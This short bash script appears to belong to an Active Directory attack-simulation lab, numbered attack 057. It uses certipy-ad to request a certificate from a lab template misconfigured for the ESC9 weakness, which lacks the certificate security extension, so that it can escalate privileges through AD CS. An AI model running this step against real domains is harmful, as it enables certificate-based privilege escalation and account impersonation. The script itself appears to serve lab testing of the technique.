#!/bin/bash
# CONFIGURED—CA cadre-CA running, ESC9 NO_SECURITY_EXTENSION flag verified
source "$(dirname "$0")/../lib/cadre-env.sh"
source "$(dirname "$0")/../lib/common.sh"

start_attack "057" "ESC9 — NoSecurityExtension + StrongCertificateBindingEnforcement bypass"

require_tool certipy-ad

log "Requesting certificate with no security extension"
run_cmd "certipy-ad req -ca $CA_NAME -template CADRE-ESC9 -u $ATTACK_USER@$DOMAIN_ROOT -p '$ATTACK_PASS' -dc-ip $DC01"
result $? "ESC9 — certificate request"
